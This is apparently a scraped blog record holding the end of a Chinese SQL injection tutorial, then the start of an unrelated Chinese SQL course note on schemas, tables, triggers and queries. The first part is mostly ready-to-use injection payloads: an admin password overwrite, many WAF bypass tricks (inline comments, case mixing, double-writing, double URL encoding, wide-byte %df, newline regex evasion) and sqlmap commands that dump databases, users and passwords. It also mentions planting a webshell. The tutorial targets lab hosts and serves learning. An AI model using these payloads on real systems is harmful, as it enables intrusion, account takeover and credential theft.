password = \u0026#39;new_password\u0026#39; WHERE username = \u0026#39;admin\u0026#39;#\u0026#39; 因为#的注释，我们竟然直接修改了admin账号的密码！\n好啦，这下我们可以随意登录管理员的账号啦~\n绕过WAF 为了防止sql注入，许多程序应用都会设置各种各样的过滤防护条件——Web应用防火墙(WAF)\n作为攻击者的我们，就需要想办法绕过这些条件，达到注入的目的\n#1 空格过滤绕过 众所周知，sql语句里面存在着大量的空格，而有些WAF会直接把空格加入黑名单，比如下面的代码：\n$id_sanitized = str_replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;, $_GET[\u0026#39;id\u0026#39;]); $sql = \u0026#34;SELECT user, password FROM users WHERE user_id = \u0026#34; . $id_sanitized; 它会直接把用户输入内容中的空格移除，然后再拼接进去\n但是，空格有很多的绕过方式\n注释绕过 在大多数的数据库（特别是mysql）中，注释/**/能够代替空格：\n1\u0026#39;/**/union/**/select/**/1,database()# 可以看到，sql语句能够正常运行\nurl编码绕过 一般来说，我们会使用+代替空格，因为+是空格的一种url标准编码形式，如果不行，就要另寻他法了\n对于大多数数据库来说，它们在解析SQL语句时，会将多种空白字符都视为空格一样的分隔符，包括：\n普通空格 (Space, %20)\n制表符 (Tab, %09)\n换行符 (Newline, %0a)\n回车符 (Carriage Return, %0d)\n虽然过滤了普通空格，但是其他的符号仍然可以起到空格相等的作用\n制表符等都是不可见字符，我们需要使用url编码来表示他们，比如：\n1\u0026#39;%0dunion%0dselect%0d1,database()# 括号绕过 数字型 mysql数据库有这样一个特性：\n在where id=1后加上=1，变成where id=1=1，意思是查询结果不变\n在where id=1后加上=0，变成where id=1=0，意思是查询结果取反\n结合substring()，我们就能构造出下面的不带有空格注入：\n1=(ascii(substring(database(),1,1))=100) 如果数据库名称第一个字符不是d，那么就会是1=0，和正常的输入1的结果是完全不同的\n这个思想和盲注异曲同工，但是你可能也发现了，上面的payload只适用于数字型的注入\n字符型\u0026amp;数字型 mysql数据库还有一个特性：\n任何可以计算出结果的语句，都可以用括号包围起来 如果我们想要在字符型进行空格的括号绕过，可以使用()把and后面的表达式包裹起来（前提是有返回值）\n上文提到的sleep()函数其实是有返回值的，执行成功为1，失败为0，因此可以使用()包裹：\n1\u0026#39;and(sleep((ascii(substring(database(),1,1))=100)+4))# 而if()函数的返回值则取决于我们写在if里面的函数：\n1\u0026#39;and(if(length(database())=4,sleep(5),1))# 效果和时间盲注相同，这种方式可以用在字符型，也可以用在数字型\n如果逗号被过滤，一般也要使用括号绕过：逗号绕过——绕过函数参数中的逗号 #2 内联注释绕过 绕过特定屏蔽词 为了保持和其他数据库的兼容，mysql数据库会执行放在/*!...*/里面的语句\n这样，如果WAF限制了不能使用一些查询语句，我们就可以把它放在/*!...*/里，比如：\n1\u0026#39; union/*!select*/ 1,2 # WAF会把它看成\u0026quot;带有奇怪符号的注释\u0026quot;而放行，但是到了mysql环境里，就能被执行：\n我们还可以在/*!...*/里面加上版本号：/*!50001...*/，表示数据库是5.00.01及以上版本，该语句才会被执行\n我使用的dvwa的mysql版本是5.5.53，如果使用1' union/*!60001select*/ 1,2 #，就会报版本错：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;1,2 #\u0026#39;\u0026#39; at line 1 干扰WAF过滤 有的WAF过滤覆盖的范围可能不够大，比如会过滤掉order by，但是如果在中间加上/*!10440*/：\n1\u0026#39; or 1=1 order/*!10440*/by 1# 这样很可能就能让WAF识别错误，如果一个内联注释不行，就多来几个：\n1\u0026#39; or 1=1 order/*!77777cz*//*!77777cz*/by 1# 或者干脆使用普通的注释干扰：\n1\u0026#39; or 1=1 order/*%%!asd%%%%*/by 1# #3 大小写绕过 有的WAF只针对小写的（或者大写的）查询语句做了过滤：\n$id = $_GET[\u0026#39;id\u0026#39;]; if (strpos($id, \u0026#39;union\u0026#39;) !\u0026lt;mark\u0026gt; false || strpos($id, \u0026#39;select\u0026#39;) !\u0026lt;/mark\u0026gt; false) { die(\u0026#39;error\u0026#39;); } $sql = \u0026#34;SELECT * FROM users WHERE user_id = \u0026#39;\u0026#34; . $id . \u0026#34;\u0026#39;\u0026#34;; 然而很多sql数据库是不区分大小写的，我们就可以大小写交错写来绕过：\n1\u0026#39; uNiOn sElEcT 1,database()# #4 双写绕过 部分WAF所做的工作只是简单的把不允许出现的查询内容（比如sql语句）替换成空字符串：\n$id_sanitized = str_replace(array(\u0026#39;union\u0026#39;, \u0026#39;select\u0026#39;), \u0026#39;\u0026#39;, $_GET[\u0026#39;id\u0026#39;]; ); $sql = \u0026#34;SELECT * FROM users WHERE user_id = \u0026#39;\u0026#34; . $id_sanitized . \u0026#34;\u0026#39;\u0026#34;; 这种过滤方式是很不可靠的，因为就算有危险内容，简陋过滤之后剩下的部分仍然会进入查询（一次过滤）\n我们就可以通过\u0026quot;双写\u0026quot;，比如selselectect，替换中间的select为空后，剩下的部分仍然是select：\n1\u0026#39; uniunionon selselectect 1,2# 过滤器替换后：\n1\u0026#39; union select 1,2# #5 编码绕过 如果WAF针对关键词进行了区分大小写的过滤，这时候就不能通过大小写和双写蒙混过关了\n不过根据WAF一次过滤的特点，我们还是利用各种编码构造出payload\n双重URL编码绕过 因为上传的payload只会url解析一次，我们把部分字符再次进行url编码：\n1\u0026#39; union se%256cect 1,database()# WAF部分(%25 -\u0026gt; %)看见的内容是：\n1\u0026#39; union se%6cect 1,database()# 执行部分(%6c -\u0026gt; l)看见的是：\n1\u0026#39; union select 1,database()# 这就成功传入了目标语句\n附上一张url编码表：\n十六进制、Unicode编码、ASCII编码绕过 其实就是把过滤的字符转换成不同的编码欺骗WAF，比如十六进制：\n1%ef%bc%87 or 1=1# 部分WAF无法解析%ef%bc%87，放行之后会在执行sql语句的服务器(比如IIS)解析，是全角字符＇：\n1＇ OR 1=1 当然你也能直接输入全角试试能不能绕过，这里只是举一个例子\n其他方式大同小异，这里不多赘述\n#6 等价代替绕过 WAF限制了某一些的符号、语句或者函数，但我们可以设法找到功能一样或相似的来代替\n逻辑符号过滤 等号(=)过滤绕过 在SQL语句里，除了=，还有很多用于比较的运算符：\nlike：用于匹配字符串，A like B表示B是A in：用于查找目标是否在对应组中 rlike：只要匹配字符串出现即可，A rlike B表示B在A里面 regexp：和rlike用法一样 between：expr between 下界 and 上界，表示是否expr \u0026gt;= 下界 \u0026amp;\u0026amp; exp \u0026lt;= 上界，上下界可以相等 如果WAF过滤了=，我们可以使用他们实现相同目的：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = \u0026#39;users\u0026#39;# 使用like匹配：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name like \u0026#39;users\u0026#39;# 使用in匹配（注意in匹配的对象要是一个组）：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name in (\u0026#39;users\u0026#39;)# 使用rlike/regexp匹配：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name rlike \u0026#39;users\u0026#39;# 使用between判断：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name between \u0026#39;users\u0026#39; and \u0026#39;users\u0026#39;# 大于号(\u0026gt;)和小于号(\u0026lt;)过滤绕过 使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找\n如果无法使用比较操作符，那么就需要使用到greatest()和least()来进行绕过了\ngreatest(n1,n2,n3,\u0026hellip;)函数返回输入参数(n1,n2,n3,\u0026hellip;)的最大值，least()则是返回最小值：\n1\u0026#39; and greatest(ascii(substr(database(),0,1)),64)=64 等价于：\n1\u0026#39; and ascii(substr(database(),0,1))\u0026gt;64 and和or过滤绕过 符号 等价符号 and \u0026amp;\u0026amp; or || xor | not ! 注释符号过滤 如果WAF过滤了#和-- ，我们可以使用另一个'闭合后面的'：\n1\u0026#39; union select 1,2 or \u0026#39;1 或者\n1\u0026#39; union select 1,\u0026#39;2 逗号过滤 绕过limit中的逗号 在进行盲注时，我们经常需要逐行读取数据，会用到limit m, n\n可以使用limit m offset n代替，表示取m行，跳过n行：\n1\u0026#39; union select 1,database() limit 1 offset 0 # 等价于\n1\u0026#39; union select 1,database() limit 0,1 # 绕过函数参数中的逗号 很多函数需要多个参数，用逗号隔开，例如substring(string, m, n)\n可以使用substring(stringfrom m for n)代替：\n1\u0026#39; and substring(database()from 1 for 1)=\u0026#39;d\u0026#39; # 如果空格被过滤了，可以使用()包裹from和for后面的数字：\n1\u0026#39; and substring(database()from(1)for(1))=\u0026#39;d\u0026#39; # 绕过select列表中的逗号 union联合查询注入时，我们经常需要一次性查询多个列，如union select user, password\n可以使用join语句代替：\n1\u0026#39; union select * from (select database())a join (select version())b# 这段语句是如何工作的？我们逐一拆解：\n(select database())a: 创建了一个只含一列（数据库名）的临时表，并别名为 a\n(select version())b: 创建了另一个只含一列（版本信息）的临时表，并别名为 b\n... a join b: 通过join将这两个只有一行一列的表连接起来，形成一个一行两列的新表\nselect * from...: 最后用 select * 将这个新表的所有列（即我们想要的数据库名和版本信息）查询出来\n当然，select后面的内容可以改成你想要的内容，select的数量也根据字段数确定，多join几次就行\n函数过滤 常见函数过滤 下面是一些常见的等价函数：\n常用函数 等价函数或语法 功能 substring(str, m, n) substr(str, m, n)\nmid(str, m, n)\nreverse+left 截取字符串 ascii(char) ord(char) 返回字符的ASCII码 if(exp1, exp2, exp3) case when exp1 then exp2 else exp3 end 条件判断语句 database() schema() 返回当前数据库名 user() current_user()\nsession_user()\nsystem_user()\n@@user 返回当前数据库用户 version() @@version 返回数据库版本信息 concat(s1, s2, ...) concat_ws(sep, s1, s2, ...)\ngroup_concat(name) 拼接字符串 hex(str) 0x... (十六进制字面量) 将字符串转换为十六进制 sleep(seconds) benchmark(count, exp) 造成时间延迟 datadir() @@datadir 返回数据库路径 大部分相信都很熟悉了，这里介绍个几个比较不常见的：\ncase when语句代替if 用法一： case when exp1 then exp2 else exp3 end\n如果exp1为真就返回exp2，反之返回exp3\n1\u0026#39; and (case when ascii(substring(database(),1,1))=100 then sleep(5) else 1 end)# 用法二： case x when y then exp2 else exp3 end\n如果x=y则返回exp2，反之返回exp3\n1\u0026#39; and(case ascii(substring(database(),1,1)) when 100 then sleep(5) else 1 end)# reverse+left代替substring left函数不能截取某一个精确的字符，但是结合reverse和ascii函数可以做到substring+ascii一样的效果：\nascii(reverse(left(string, n))) 这个组合可以做到取出string字符串第n位的ascii码\n怎么工作的呢？我们以ascii(reverse(left('ABCDE', 3)))为例：\nleft('ABCDE', 3)\n首先，left()函数从左边截取前3个字符，得到结果 'ABC'\nreverse('ABC')\n接着，reverse()函数将上一步的结果'ABC'进行反转，得到'CBA'\nascii('CBA')\n这是最关键的一步，ascii()函数会返回其参数字符串的第一个字符的ASCII码\n在这里，字符串'CBA'的第一个字符是'C'，其ASCII码是67\ntrim代替substring trim()函数在SQL中主要用于移除字符串首尾的字符\ntrim(both|leading|trailing remstr from str) str: 要处理的源字符串\nremstr: 要从str中移除的子字符串\nboth|leading|trailing: 指定移除的位置\nleading: 只从开头移除\ntrailing: 只从结尾移除\nboth: 从开头和结尾两端移除（默认）\n但如果我们让它移除一个不存在的字符，他什么都不会做：\ntrim(leading \u0026#39;e\u0026#39; from \u0026#39;abcd\u0026#39;) 返回的结果仍然是abcd，因为abcd的开头不是e\n利用这一点，我们就可以不直接比较字符是否相等，而是通过比较两次trim()操作的结果是否相同，来推断一个字符是否是目标字符串的开头\n第一次trim()：\n(trim(leading \u0026#39;a\u0026#39; from database()) = (trim(leading \u0026#39;b\u0026#39; from database())) 前者返回 'dvwa' （开头不是\u0026rsquo;a\u0026rsquo;）,后者返回 'dvwa' （开头也不是\u0026rsquo;b\u0026rsquo;）最终 'dvwa' = 'dvwa'，表达式为真\n这样的话，我们就能判断数据库名称不是以a或者b开头，跳过这两个字母，继续往下尝试\n第二次trim()：\n(trim(leading \u0026#39;c\u0026#39; from database()) = (trim(leading \u0026#39;d\u0026#39; from database())) 前者返回 'dvwa' （开头不是\u0026rsquo;c\u0026rsquo;）,后者返回 'vwa' （开头是\u0026rsquo;d\u0026rsquo;）最终 'dvwa' = 'vwa'，表达式为假\n我们就能够判断，数据库名称是以c和d其中的一个字母开头，取其中一个字母，继续往下尝试\n第三次trim()：\n(trim(leading \u0026#39;d\u0026#39; from database()) = (trim(leading \u0026#39;e\u0026#39; from database())) 表达式为'vwa' = 'dvwa'，表达式为假，我们就可以确定，数据库名称是以d和e其中的一个字母开头\n再结合上一次的判断结果，c和d中有一个是开头字母，就能确定是以d开头了\n如果这个表达式为假，说明d和e都不是，而c和d中有一个是，我们同样能以此确定是以c开头\n这样一位一位判断，就能凑出全貌\n#7 宽字节绕过 注入原理 宽字节注入是一种专门针对Web应用程序与数据库之间字符集编码不一致而产生的SQL注入漏洞\n其核心原理是PHP转义函数的单字节和MySQL数据库（当使用GBK等宽字节编码时）的多字节之间的矛盾\nWeb应用层（如PHP）：WAF在工作时，并不关心字符的实际编码 。它只是简单地将它认为是危险的单字节字符（如单引号'，其十六进制为0x27），并前面加上一个反斜杠\\进行转义（十六进制为0x5c），让这个危险的字符失去原本的功能，被当成普通的字符进行查询\n数据库层（如MySQL）：当数据库连接的字符集被设置为GBK这类宽字节编码时，它会尝试将两个连续的字节解析为一个汉字或其他宽字符\n在GBK编码中，一个宽字节的第一个字节的范围是0x81-0xFE 。当MySQL遇到这个范围内的字节时，它会认为这是一个宽字符的开始，并把紧随其后的下一个字节也一并“吃掉”，作为该字符的第二部分\n攻击者正是利用了MySQL的这个特性，构造一个第一个字节在0x81-0xFE范围内、而第二个字节恰好是0x5c（即反斜杠\\）的字符，让MySQL把PHP辛苦加上去的反斜杠当作普通字符“吃掉”，从而使单引号'重新变有效，导致注入成功\n注入过程 mysql_query(\u0026#34;SET NAMES gbk\u0026#34;); $id=check_addslashes($_GET[\u0026#39;id\u0026#39;]); $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; 这段代码的关键点在于，它使用SET NAMES gbk将数据库连接设置为GBK编码，同时又使用了自定义的check_addslashes函数对输入进行转义\n普通注入(1\u0026rsquo;#)：\n攻击者提交?id=1'#，check_addslashes函数将'转义为\\' ，mysql最后执行的语句是：\nSELECT * FROM users WHERE id=\u0026#39;1\\\u0026#39;#\u0026#39; 这里的转义后的'变成了普通的符号，无法闭合字符串\n宽字节注入(1%df\u0026rsquo;#)：\n攻击者提交?id=1%df'#，check_addslashes函数将'转义为\\'，在url编码下变成：\n?id=1%df%5c%27# %5c就是被添加进去的反斜杠\\\n请求到达MySQL服务器，由于连接是GBK编码，MySQL开始按照GBK规则解析字节流0xdf 0x5c 0x27：\nMySQL首先读到0xdf，因为它在0x81-0xFE范围内，MySQL认为这是一个宽字符的开始\n随后，MySQL“吃掉”了紧随其后的0x5c（反斜杠\\）作为这个宽字符的第二字节\n0xdf5c被组合成了一个宽字符（在GBK中为“運”），此时，用于转义的反斜杠\\已经被消耗掉了\nMySQL继续向后解析，遇到了0x27（单引号'）这个单引号前面已经没有了反斜杠，它变成了一个有效的SQL语法符号\n最终，MySQL实际执行的语句变成了：\nSELECT * FROM users WHERE id=\u0026#39;1運\u0026#39;\u0026#39; # #8 正则表达式绕过 众所周知，正则表达式里有很多的修正符，只有设置适当，才能过滤到目标的字符串\n有些粗心的WAF没有设置好修正符，这就让我们有机可乘：\n$id = $_GET[\u0026#39;id\u0026#39;]; $pattern = \u0026#39;/select.*from/i\u0026#39;; if (preg_match($pattern, $id)) { die(\u0026#39;检测到攻击，脚本终止！(Attack Detected!)\u0026#39;); } $sql = \u0026#34;SELECT * FROM users WHERE user_id = \u0026#39;\u0026#34; . $id . \u0026#34;\u0026#39;\u0026#34;; 在这里的过滤中，WAF使用了i修正符匹配正则select.*from，意味着大小写绕过无效\n然而，他忘记了使用s修正符！\n元字符.可以匹配除换行符以外的任意单个字符，没有使用s修正符，所以 . 无法匹配换行符！\n而对于MySQL来说，换行符和空格、制表符一样，都是合法的空白分隔符\n所以，我们可以在查询语句里面插入换行符绕过：\n1\u0026#39; union select 1,table_name%0afrom information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; # ↑ #9 多参数请求拼凑 部分表单（比如登录界面）是通过拼凑用户输入的内容来进行查询的，比如：\n$param_a = $_GET[\u0026#39;a\u0026#39;]; $param_b = $_GET[\u0026#39;b\u0026#39;]; $sql = \u0026#34;SELECT * FROM products WHERE type = \u0026#39;\u0026#34; . $param_a . \u0026#34;\u0026#39; AND detail = \u0026#39;\u0026#34; . $param_b . \u0026#34;\u0026#39;\u0026#34;; WAF可能对单个的内容做了过滤，这时候我们就可以把注入语句拆分\na部分输入：\n1\u0026#39; union/* b部分输入：\n*/select 1,2# 这样拼凑之后的sql语句就是：\nSELECT * FROM products WHERE type = \u0026#39;1\u0026#39; union/*\u0026#39; AND detail = \u0026#39;*/select 1,2#\u0026#39; ~~~~~~~~~~~~~~~~~~~~~~~~~ 我们就把中间b的部分注释掉了，并且绕过了WAF，成功注入了查询语句\n恭喜，你现在已经学会了手工注入！\n呃，可是这也太麻烦了吧，又要判断这个又要试那个的，难道没有更简单的方法吗?\n当然是有的！那就是使用自动化注入工具\u0026ndash;SqlMap！\nSqlMap使用 下载地址：\ngit clone https://github.com/sqlmapproject/sqlmap.git 基本使用步骤 检查注入点 -u：指定目标url\n\u0026ndash;batch：全自动模式，问什么都答对(y)`\nsqlmap -u http://192.168.204.133/show.php?id=33 --batch sqlmap指出它通过四种不同的方式成功注入了目标：\nboolean-based blind (布尔盲注) error-based (报错注入) time-based blind (时间盲注) UNION query (联合查询注入) 而由布尔盲注的payload:id=33 AND 3115=3115可以看出是数字型注入（id=33周围无单引号）\n由联合查询注入的target URL appears to have 15 columns in query可以知道一共有十五个字段\n爆破数据库信息 -dbs：爆破所有的数据库名称\nsqlmap -u http://192.168.204.133/show.php?id=33 --dbs --batch \u0026ndash;current-db：爆破当前数据库名称\nsqlmap -u http://192.168.204.133/show.php?id=33 --current-db --batch 结果说明现在的表名为cms\n爆破指定数据库的所有表名 -D：指定数据库名\n\u0026ndash;tables：枚举所有表\nsqlmap -u http://192.168.204.133/show.php?id=33 -D cms --tables --batch 爆破指定表的所有列名 -T：指定表名\n\u0026ndash;colums：枚举所有列\n注意此处要先指定数据库名，再指定表名：\nsqlmap -u http://192.168.204.133/show.php?id=33 -D cms -T cms_users --columns --batch #### extractvalue (XML_document, XPath_string)\n第一个参数：XML_document 是目标XML文档 第二个参数：XPath_string 是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容 select user,password from users where user_id=1 and (extractvalue(1,0x7e)); 由于0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误\nupdatexml (XML_document, XPath_string, new_value) 打印指定列名的字段数据 -C：指定列名\n\u0026ndash;dump：取出指定列名的所有数据\nsqlmap -u http://192.168.204.133/show.php?id=33 -D cms -T cms_users -C username,password --dump --batch 查看用户权限 \u0026ndash;users：列出数据库管理系统用户\nsqlmap -u http://192.168.204.133/show.php?id=33 --users --batch \u0026ndash;current-user：查看当前连接数据库用户\nsqlmap -u http://192.168.204.133/show.php?id=33 --current-user --batch \u0026ndash;is-dba：判断当前用户是否是DBA（数据库管理员）\nsqlmap -u http://192.168.204.133/show.php?id=33 --is-dba --batch 如果是数据库管理员，就代表有写的权限，可以在服务器上面写入一句话木马\n查看数据库密码 \u0026ndash;password：自动寻找有没有常见的用户名和密码列\n可以看成是一系列操作（找到password表和dump）的自动化：\nsqlmap -u http://192.168.204.133/show.php?id=33 -passwords 结合burpsuite使用 有的时候我们需要对一个表单进行注入，这时候就可以使用post注入\n-r：从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）\n拦截请求 在设置代理后，表单随便填一个内容提交，查看post请求内容，复制另存为.txt\n进行爆破 sqlmap -r post.txt --dbs --batch 同样可以得到正确结果\n","date":"2025-07-02T00:52:02+08:00","permalink":"https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/","title":"SQL注入：从入门到入土"},{"content":"模式 定义模式 CREATE SCHEMA 模式名 AUTHORIZATION 用户名\neg:为用户ZHANG定义一个S-T模式：\nCREATE SCHEMA \u0026#34;S-T\u0026#34; AUTHORIZATION ZHANG eg:为用户ZHANG定义一个未命名的模式：\nCREATE SCHEMA AUTHORIZATION ZHANG 未定义模式名称的时候，默认模式为用户名\n删除模式 DROP SCHEAM 模式名\n普通：用于删除空的模式，如果模式下面有对象（表、视图）等，拒绝删除\nDROP SCHEAM 模式名 CASCADE\n级联：把模式里面的对象一并删除\nDROP SCHEAM 模式名 RESTRICT\n限制：会把对象转移到公共模式保留并删除模式，但如果对象和模式有联系，则拒绝删除模式\n基本表 定义基本元素 数据类型 数据类型 表示内容 CHAR(n) 长度为n的字符型 VARCHAR(n) 最大长度为n的变长字符型 NUMBER(n) 长度为n的数字型 INT 长整型(4B) SMALLINT 短整型(4B) BIGINT 大整型(8B) FLOAT(n) 精度至少为n位的浮点数 DATE 日期，格式为YYYY-MM-DD TIME 时间，格式为HH:MM:SS 列级完整性约束条件 约束条件 意义 PRIMARY KEY 主码（元素唯一不能重复）：当只有一个主码时，可直接在对应的属性列标注 NOT NULL 非空：表示该属性列不能取空值 UNIQUE 唯一值：表示该属性列只能取唯一值 CHECK 检查：检查该列是否满足某个条件，比如CHECK(某属性\u0026gt;20) 表级完整性约束条件 约束条件 意义 PRIMARY KEY(列名1,\u0026hellip;,列名n) 多个主码：当主码由多个属性构成时，\n必须作为表级完整性定义 FOREIGN KEY(列名1) REFERENCES 被参照表(列名1) 外码：被参照的列必须是 PRIMARY KEY 或 UNIQUE 约束 的列，\n本表所有值来源于被参照的列 特殊完整性约束条件——断言 相较于列级的CHECK语句，断言能指定更一般的约束\n创建断言 CREATE ASSERTION 断言名 CHECK字句;\neg.限制A课程最多60人选修：\nCREATE ASSERTION ASSE CHECK(60\u0026gt;= SELECT COUNT(*) FROM TAB1,TAB2 WHERE TAB1.NUM=TAB2.NUM AND TAB2.CLASS=\u0026#34;A\u0026#34;); -- 此处具体操作原理往后看 删除断言 DROP ASSERTION 断言名;\n特殊完整性约束条件——触发器 触发器是用户定义在关系表上的一类由事件驱动的特殊过程\n表的拥有者才能在表上创建触发器\n触发器只能定义在基本表上，不能定义在视图上\n定义触发器 CREATE TRIGGER 触发器名\n{BEFORE|AFTER} 触发事件 ON 表名\nREFERENCING NEW|OLD ROW AS 变量\nFOR EACH {ROW|STATEMENT}\n[WHEN 触发条件]触发动作体\n触发事件：INSERT DELETE UPDATE 或者他们的组合\n还可以UPDATE OF\u0026lt;触发列1,...\u0026gt;，即进一步指明修改哪些列时激活触发器 BEFORE/AFTER：触发时机，表示在触发事件的操作执行之前激活触发器\nROW/STATEMENT：指明是行级/语句级触发器，行级有多少行就触发多少次，语句级只触发一次\n触发条件：只有触发条件为真时才执行动作体，省略WHEN则立即执行动作体\n触发动作体：行级可以使用NEW/OLD引用事件之后的新值和事件之前的旧值，语句级不行\neg.对TAB1的Grade属性修改时，若增加了10%，则将操作记录在TAB2(Name,OldGrade,NewGrade)中\nCERATE TRIGGER TAB1_T AFTER UPDATE OF Grade ON TAB1 REFERENCING OLD row AS OldTuple, NEW row AS NewTuple FOR EACH ROW WHEN(NewTuple.Grade\u0026gt;=1.1*OldTuple.Grade) INSERT INTO TAB2(Name,OldGrade,NewGrade) VALUES(OldTuple.Name,OldTuple.Grade,NewTuple.Grade); 如果触发器内有多个语句，要定义新的定界符（不常用的），并使用BEGIN和END包裹：\n-- 1. 将定界符从 ; 改为 // DELIMITER // -- 2. 定义包含多条语句的触发器 CREATE TRIGGER TAB1_T AFTER UPDATE OF Grade ON TAB1 REFERENCING OLD row AS OldTuple, NEW row AS NewTuple FOR EACH ROW BEGIN -- 检查条件 IF (NewTuple.Grade \u0026gt;= 1.1 * OldTuple.Grade) THEN -- 这是块内的第一条语句，用 ; 结尾 INSERT INTO TAB2(Name, OldGrade, NewGrade) VALUES(OldTuple.Name, OldTuple.Grade, NewTuple.Grade); END IF; -- IF语句也需要用 ; 结尾 -- 3. 使用新的定界符 // 来结束整个 CREATE TRIGGER 命令 END // -- 4. 将定界符改回默认的 ; DELIMITER ; 激活触发器 多个触发器执行顺序：\n执行BEFORE触发器 -\u0026gt; 激活触发器的SQL语句 -\u0026gt; 执行AFTER触发器\n删除触发器 DROP TRIGGER 触发器名 ON 表名;\n定义基本表 CREATE TABLE 表名 (列名1 数据类型 列级完整性约束条件, 列名n 数据类型 列级完整性约束条件, 表级完整性约束条件1, 表级完整性约束条件n );\neg:\nCREATE TABLE TAB1 (Ch VARCHAR(10), Nu NUMBER(10), Grade INT NOT NULL, PRIMARY KEY(Ch,Nu), -- 多个主码 FOREIGN KEY(Ch) REFERENCES TAB2(Ch) ); 在模式中定义表 一个模式包含很多基本表，有三种方式在模式里面定义基本表\n创建表的时候指出模式 CREATE TABLE 模式名.表名();\n创建模式时直接定义表 CREATE SCHEMA 模式名 AUTHORIZATION 用户名 CREATE TABLE 表名();\n事先设置所属的模式 SET SCHEMA \u0026lsquo;my_schema\u0026rsquo;\neg.\nSET SCHEMA \u0026#39;my_schema\u0026#39;; CREATE TABLE my_table ( id INT PRIMARY KEY, name VARCHAR(100) ); my_table 将被创建在 my_schema 模式下\n修改基本表 同样的，修改表时想要指定模式里面的表，就使用“模式名.表名”的方式指定表名\n增加新的属性列 ALTER TABLE 表名 ADD 新列名 数据类型 完整性约束条件;\neg.向TAB1里增加时间列Time：\nALTER TABLE TAB1 ADD Time DATE; 当然，还能在ADD后面加上修饰词COLUMN，这样会更容易理解是在添加列，对功能没有影响：\nALTER TABLE TAB1 COLUMN Time DATE; ~~~~~~ 增加列级完整性约束条件 ALTER TABLE SC ADD 列级完整性约束条件;\neg.向TAB1里增加Grade列必须取唯一值的条件：（Grade必须要已经存在）\nALTER TABLE TAB1 ADD UNIQUE(Grade); 增加表级完整性约束条件 ALTER TABLE SC ADD 表级完整性约束条件;\neg.向TAB1里增加Ch为外码的条件，参照表是TAB2：\nALTER TABLE TAB1 ADD FOREIGN KEY(Ch) REFERENCES TAB2(Ch); 删除列 ALTER TABLE 表名 DROP CASCADE;\n级联：引用了该列的其他对象（例如视图）一起删除\nALTER TABLE 表名 DROP RESTRICT;\n限制：若该列被其他对象引用，则拒绝删除\n删除指定的完整性约束条件 ALTER TABLE 表名 DROP CONSTRAINT 完整性约束名 CASCADE/RESTRICT;\n修改列 ALTER TABLE 表名 ALTER COLUMN 列名 数据类型;\neg.把Grade由INT型修改成字符型：\nALTER TABLE 表名 ALTER COLUMN 列名 数据类型； 删除基本表 DROP TABLE 表名 CASCADE;\n级联：把表相关的依赖对象（比如视图）一并删除\nDROP TABLE 表名 RESTRICT;\n限制：如果此表被其他表依赖（外码）或者有视图等，拒绝被删除\n索引 建立索引 建立唯一索引 CREATE UNIQUE INDEX 索引名 ON 表名(列名1 次序,列名n 次序);\n唯一索引 是关于数据值是否唯一的，它强制数据的唯一性，并帮助快速查找特定值\neg.为表TAB1按照学号升序和时间降序建立唯一的索引：\nCREATE UNIQUE INDEX NewIndex ON TAB1(Nu ASC,Time DESC); ASC：asceding，升序 DESC：descending，降序\n建立聚簇索引 CREATE CLUSTER INDEX 索引名 ON 表名(列名1 次序,列名n 次序);\n聚簇索引 是关于数据如何物理存储的，它把数据和索引紧密地绑定在一起，让查找和范围查询非常快\n重命名索引 ALTER INDEX 旧索引名 RENAME TO 新索引名;\neg.把TAB1表的NewIndex索引重命名为OldIndex：\nALTER INDEX NewIndex RENAME TO OldIndex; 删除索引 DROP INDEX 索引名;\n查询数据\u0026ndash;SELECT语句 一般格式 SELECT ALL/DISTINCT 目标列表达式\nFROM 表名/视图名\nWHERE 条件表达式\nGROUP BY 列名 HAVING 条件表达式\nORDER BY 列名 次序;\nSELECT 目标列表达式 查询指定的列 SELECT 列名1，列名n\neg.查询TAB1的Ch列和Nu列：\nSELECT Ch,Nu FROM TAB1; 查询全部的列 SELECT *\neg.查询TAB1的全部记录：\nSELECT * FROM TAB1; 查询计算后的值 SELECT 表达式\n表达式可以是算术表达式（+、-\u0026hellip;)，字符串常量，函数等等\neg.查询TAB1里面所有Grade减去2的值：\nSELECT Grade-2 FROM TAB1; 改变查询结果的列标题 SELECT 列名 别名\neg.查询TAB1里面的Ch列和Nu列，在结果里面使用Chinese和Num显示\nSELECT Ch Chinese,Nu Number FROM TAB1; 去除查询结果的重复行 SELECT DISTINCT 列名\n如果没有使用DISTINCT，默认为ALL\n聚集函数 聚集函数只处理非空值\n聚集函数只能用于SELECT语句和CROUP BY中的HAVING子句\n统计元组个数 COUNT(*)\n某个元组的一个或者部分取空值的时候，不影响统计结果\neg.查询TAB1里面的总数：\nSELECT COUNT(*) FROM TAB1; 统计某一列值的个数 COUNT(DISTINCT/ALL 列名)\n指定DISTINCT会去重，NULL不计入总数\n计算某一列值的平均数（该列必须为数值型） AVG(DISTINCT/ALL 列名)\neg.查询TAB1里面的Grade平均值：\nSELECT AVG(ALL Grade) FROM TAB1; 计算某一列值的总和（该列必须为数值型） SUM(DISTINCT/ALL 列名)\n计算某一列值的最大值/最小值 MAX/MIN(DISTINCT/ALL 列名)\nWHERE 条件表达式 比较大小 WHERE 列名 运算式\n常用运算符：=\t\u0026gt;\t\u0026lt;\t\u0026gt;=\t\u0026lt;=\t!=/\u0026lt;\u0026gt;\t!\u0026gt;\t!\u0026laquo;/mark\u0026gt;\neg.查询TAB1里面所有三年级（Grade=3）的学生的姓名：\nSELECT Ch FROM TAB1 WHERE Grade=3; 